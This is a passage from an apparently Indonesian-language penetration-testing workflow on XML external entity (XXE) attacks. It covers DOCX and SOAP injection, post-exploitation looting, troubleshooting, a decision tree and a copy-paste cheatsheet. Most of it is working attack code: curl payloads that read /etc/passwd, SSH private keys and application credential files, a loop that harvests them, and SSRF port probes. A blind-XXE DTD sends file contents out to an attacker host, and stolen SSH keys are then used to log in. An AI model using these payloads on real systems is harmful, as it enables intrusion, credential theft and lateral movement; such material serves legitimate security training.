# Zip menjadi docx
zip -r /tmp/xxe_payload.docx . > /dev/null 2>&1
echo "[*] Created: /tmp/xxe_payload.docx"

# Upload
curl -i -X POST \
  -F "file=@/tmp/xxe_payload.docx;type=application/vnd.openxmlformats-officedocument.wordprocessingml.document" \
  "http://$TARGET/upload"
```

**OUTPUT BERHASIL ✅ — DOCX diproses dan XXE trigger:**

text

```
{"preview":"web01","status":"processed"}
```

atau callback di receiver untuk blind XXE.

---

## ═══════════════════════════════════════

## FASE 6: XXE VIA SOAP

## ═══════════════════════════════════════

Bash

```
# Step 1: Kirim SOAP request normal untuk baseline
curl -i -X POST \
  -H 'Content-Type: text/xml' \
  -H 'SOAPAction: "getUser"' \
  --data-binary @- "http://$TARGET/soap" <<'EOF'
<?xml version="1.0"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <getUser><name>alice</name></getUser>
  </soap:Body>
</soap:Envelope>
EOF

# Step 2: Inject XXE dalam SOAP
curl -i -X POST \
  -H 'Content-Type: text/xml' \
  -H 'SOAPAction: "getUser"' \
  --data-binary @- "http://$TARGET/soap" <<'EOF'
<?xml version="1.0"?>
<!DOCTYPE soap:Envelope [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <getUser><name>&xxe;</name></getUser>
  </soap:Body>
</soap:Envelope>
EOF
```

**OUTPUT BERHASIL ✅ — SOAP XXE berhasil:**

XML

```
<soap:Envelope>
  <soap:Body>
    <getUserResponse>
      <result>web01</result>
    </getUserResponse>
  </soap:Body>
</soap:Envelope>
```

---

## ═══════════════════════════════════════

## FASE 7: POST-EXPLOITATION & PIVOT

## ═══════════════════════════════════════

### Setelah XXE Confirmed — Kumpulkan Intel untuk Lateral Movement

Bash

```
# Linux: Kumpulkan semua informasi berguna
TARGET_FILES=(
  "/etc/passwd"           # User list
  "/etc/hosts"            # Network topology
  "/etc/hostname"         # Machine name
  "/proc/net/arp"         # ARP table (discover internal IPs)
  "/proc/net/tcp"         # Open ports
  "/home/user/.ssh/id_rsa"     # SSH private key
  "/root/.ssh/id_rsa"          # Root SSH key
  "/root/.ssh/authorized_keys" # Authorized keys
  "/var/www/html/.env"         # App credentials
  "/var/www/html/config.php"   # App credentials
)

echo "=== Starting XXE File Loot ==="
for file in "${TARGET_FILES[@]}"; do
  echo -n "Reading $file... "
  RESULT=$(curl -s --max-time 10 -X POST -H 'Content-Type: application/xml' \
    --data-binary "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"file://$file\">]><r><d>&x;</d></r>" \
    "http://$TARGET/api/import" 2>/dev/null)
  
  if echo "$RESULT" | grep -qE '(root:|www-data:|admin|password|BEGIN|127\.0\.0\.1)'; then
    echo "[SUCCESS]"
    FNAME=$(basename "$file")
    echo "$RESULT" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('d',''))" 2>/dev/null \
      || echo "$RESULT" \
      | tee ~/xxe_loot/files/"$FNAME"
  else
    echo "[EMPTY/FAILED]"
  fi
done
```

### Cross-Service Correlation Chart

text

```
XXE → Data Exfiltration
     │
     ├─ ─ /etc/passwd → Username list → Brute SSH → <a href="/docs/ssh" class="text-[#00b4d8] hover:underline font-mono font-semibold">06_ssh_workflow.md</a>
     │
     ├─ ─ SSH private key → SSH login → <a href="/docs/ssh" class="text-[#00b4d8] hover:underline font-mono font-semibold">06_ssh_workflow.md</a>
     │
     ├─ ─ DB credentials → DB pivot → <a href="/docs/mysql" class="text-[#00b4d8] hover:underline font-mono font-semibold">14a_mysql_workflow.md</a> / [Pentest Workflow: Microsoft SQL Server (MSSQL) Exploitation](/docs/mssql)
     │
     ├─ ─ .env / config.php → App secrets → <a href="/docs/authentication-bypass" class="text-[#00b4d8] hover:underline font-mono font-semibold">18_authentication_bypass_workflow.md</a>
     │
     ├── SSRF → Internal admin → Pivot ke internal service
     │
     ├─ ─ SSRF → AWS metadata → IAM credentials → <a href="/docs/aws-pentest" class="text-[#00b4d8] hover:underline font-mono font-semibold">60_aws_pentest_workflow.md</a>
     │
     └─ ─ /proc/net/* → Internal network map → <a href="/docs/pivoting-tunneling" class="text-[#00b4d8] hover:underline font-mono font-semibold">64_pivoting_tunneling_workflow.md</a>
```

**Jika ditemukan SSH private key:**

Bash

```
# Simpan dan gunakan SSH key
curl -s -X POST -H 'Content-Type: application/xml' \
  --data-binary '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///home/user/.ssh/id_rsa">]><r><d>&x;</d></r>' \
  "http://$TARGET/api/import" | python3 -c "import sys,json; print(json.load(sys.stdin).get('d',''))" \
  > ~/xxe_loot/files/id_rsa

chmod 600 ~/xxe_loot/files/id_rsa

# Cek apakah ada passphrase
ssh-keygen -y -f ~/xxe_loot/files/id_rsa

# Coba SSH dengan key
# Dapatkan username dari /etc/passwd dulu
ssh -i ~/xxe_loot/files/id_rsa user@$TARGET
# → Ke <a href="/docs/ssh" class="text-[#00b4d8] hover:underline font-mono font-semibold">06_ssh_workflow.md</a> jika berhasil
```

---

## ═══════════════════════════════════════

## TROUBLESHOOTING — SEMUA ERROR & SOLUSINYA

## ═══════════════════════════════════════

|Error|Penyebab|Solusi|
|---|---|---|
|`DOCTYPE is disallowed`|Parser eksplisit disable DTD|Coba XInclude (Langkah 1.4) atau SVG upload (Fase 5A)|
|Entity tidak di-resolve (literal muncul)|Entity processing disabled|Coba XInclude atau file upload|
|`permission denied` membaca file|Process tidak punya permission|Coba file lain: `/etc/hostname`, `/proc/version`|
|File muncul tapi XML error|File mengandung `<`, `>`, `&`|Gunakan `php://filter/convert.base64-encode`|
|`DTD request masuk tapi tidak ada data callback`|Parameter entity nesting restriction|Gunakan double entity trick (`&#x25;`) atau coba varian lain|
|OOB callback tidak sampai|Egress firewall|Gunakan interactsh/Burp Collaborator untuk DNS callback|
|SVG upload ditolak|Extension/MIME filter|Coba rename atau Content-Type bypass|
|DOCX tidak trigger XXE|Parser library aman by default|Library modern disable external entities|
|`403 Forbidden` di endpoint|Perlu authentication|Tambahkan cookie/auth header dari session aktif|
|SOAP returns 415|Content-Type salah|Ganti antara `text/xml` dan `application/soap+xml`|
|AWS metadata 401|IMDSv2 aktif|Tidak bisa via XXE, skip ke SSRF biasa|
|Timeout saat probe internal port|Port closed/filtered|Bandingkan timing: open port lebih cepat dari closed|
|Base64 output rusak|Response encoding|Ambil raw response sebelum JSON parse|
|Port Python server sudah dipakai|Konflik port|`kill $(lsof -ti:8000)` kemudian restart|

---

## ═══════════════════════════════════════

## MASTER DECISION TREE (RINGKASAN)

## ═══════════════════════════════════════

text

```
START: Endpoint menerima XML / File Upload
│
├─ FASE 0: Identifikasi attack surface
│   ├─ [Direct XML POST]    → Fase 1
│   ├─ [File Upload (SVG)]  → Fase 5A
│   ├─ [File Upload (DOCX)] → Fase 5B
│   └─ [SOAP endpoint]      → Fase 6
│
├─ FASE 1: Konfirmasi Entity Resolution
│   ├─ [Internal entity resolved] → Test external entity
│   │   ├─ [File content muncul] → FASE 2 (File Disclosure)
│   │   ├─ [File kosong/error]   → PHP wrapper / error-based
│   │   └─ [Tidak ada output]    → FASE 3 (Blind XXE)
│   ├─ [DOCTYPE diblok]     → XInclude (Langkah 1.4)
│   └─ [XML tidak diterima] → File Upload path
│
├─ FASE 2: File Disclosure
│   ├─ [/etc/passwd]        → User enum → SSH brute
│   ├─ [Config files]       → DB/App creds → Pivot
│   └─ [SSH keys]           → Direct SSH login
│
├─ FASE 3: Blind XXE
│   ├─ [OOB HTTP works]     → External DTD exfiltration
│   ├─ [OOB blocked]        → Interactsh DNS callback
│   └─ [Error visible]      → Error-based exfiltration
│
├─ FASE 4: XXE → SSRF
│   ├─ [Internal service]   → Probe & access admin panel
│   ├─ [AWS metadata]       → IAM credentials → <a href="/docs/aws-pentest" class="text-[#00b4d8] hover:underline font-mono font-semibold">60_aws_pentest_workflow.md</a>
│   └─ [Internal DB]        → DB direct access
│
└─ FASE 7: Post-Exploitation
    └─ [Data collected] → Pivot ke service lain
```

---

## ⚡ CHEATSHEET — COPY PASTE READY

Bash

```
# === SETUP ===
export TARGET="10.10.11.200"; export LHOST="10.10.14.5"; export LPORT="8000"
mkdir -p ~/xxe_loot/{files,dtd,payloads,notes}

# === BASELINE ===
curl -s -X POST -H 'Content-Type: application/xml' \
  --data-binary '<user><name>alice</name></user>' "http://$TARGET/api/import"

# === INTERNAL ENTITY TEST ===
curl -s -X POST -H 'Content-Type: application/xml' \
  --data-binary '<?xml version="1.0"?><!DOCTYPE u [<!ENTITY t "XXE_TEST_123">]><u><n>&t;</n></u>' \
  "http://$TARGET/api/import" | grep -o 'XXE_TEST_123'

# === FILE READ ===
curl -s -X POST -H 'Content-Type: application/xml' \
  --data-binary '<?xml version="1.0"?><!DOCTYPE u [<!ENTITY x SYSTEM "file:///etc/hostname">]><u><n>&x;</n></u>' \
  "http://$TARGET/api/import"

# === PHP WRAPPER (bypass XML parsing issues) ===
curl -s -X POST -H 'Content-Type: application/xml' \
  --data-binary '<?xml version="1.0"?><!DOCTYPE u [<!ENTITY x SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><u><n>&x;</n></u>' \
  "http://$TARGET/api/import" | grep -oE '[A-Za-z0-9+/]{20,}={0,2}' | base64 -d

# === SSRF PROBE ===
for p in 80 8080 8000 3000 6379 27017; do
  echo -n "Port $p: "
  curl -s --max-time 3 -X POST -H 'Content-Type: application/xml' \
    --data-binary "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"http://127.0.0.1:$p/\">]><r><d>&x;</d></r>" \
    "http://$TARGET/api/import" | head -1
done

# === BLIND XXE SETUP ===
python3 -m http.server $LPORT &    # Serve DTD
python3 /tmp/xxe_receiver.py $LPORT &    # Receive callbacks

# DTD untuk hostname exfil
echo "<!ENTITY % file SYSTEM \"file:///etc/hostname\">
<!ENTITY % eval \"<!ENTITY &#x25; send SYSTEM 'http://$LHOST:$LPORT/?d=%file;'>\">
%eval;
%send;" > ~/xxe_loot/dtd/xxe.dtd

# Send blind XXE
curl -s -X POST -H 'Content-Type: application/xml' \
  --data-binary "<?xml version=\"1.0\"?><!DOCTYPE root SYSTEM \"http://$LHOST:$LPORT/xxe.dtd\"><root><d>x</d></root>" \
  "http://$TARGET/api/import"

# === XINCLUDE (jika DOCTYPE diblok) ===
curl -s -X POST -H 'Content-Type: application/xml' \
  --data-binary '<?xml version="1.0"?><root xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/hostname" parse="text"/></root>' \
  "http://$TARGET/api/import"

# === SOAP XXE ===
curl -s -X POST -H 'Content-Type: text/xml' -H 'SOAPAction: ""' \
  --data-binary '<?xml version="1.0"?><!DOCTYPE s [<!ENTITY x SYSTEM "file:///etc/hostname">]><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"><s:Body><test><name>&x;</name></test></s:Body></s:Envelope>' \
  "http://$TARGET/soap"
```

---

> **➡️ NEXT:** Setelah XXE berhasil dan mendapat data sensitif, kemungkinan terbesar adalah credential dari config file → lanjut ke **`14_database_workflow.md`** untuk exploit database, atau SSH key → **`<a href="/docs/ssh" class="text-[#00b4d8] hover:underline font-mono font-semibold">06_ssh_workflow.md</a>`**. Jika SSRF berhasil ke internal service → **`<a href="/docs/ssrf" class="text-[#00b4d8] hover:underline font-mono font-semibold">22_ssrf_workflow.md</a>`** untuk full SSRF exploitation workflow.